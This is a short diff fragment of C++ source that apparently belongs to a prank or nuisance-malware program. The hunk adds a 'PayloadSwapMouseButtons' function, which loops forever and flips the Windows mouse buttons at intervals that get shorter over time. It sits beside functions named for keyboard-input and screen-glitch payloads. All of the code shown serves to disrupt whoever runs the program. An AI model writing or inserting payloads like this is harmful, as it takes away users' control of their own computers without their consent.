@@ -118,6 +118,16 @@ void PayloadKeyboardInput(void)
 	}
 }
 
+void PayloadSwapMouseButtons(void)
+{
+	for (;;) {
+		SwapMouseButton(false);
+		std::this_thread::sleep_for(std::chrono::seconds(30 - (runtime * 2)));
+		SwapMouseButton(true);
+		std::this_thread::sleep_for(std::chrono::seconds(1));
+	}
+}
+
 void PayloadScreenGlitch(void)
 {
 	auto x = GetSystemMetrics(SM_CXSCREEN);
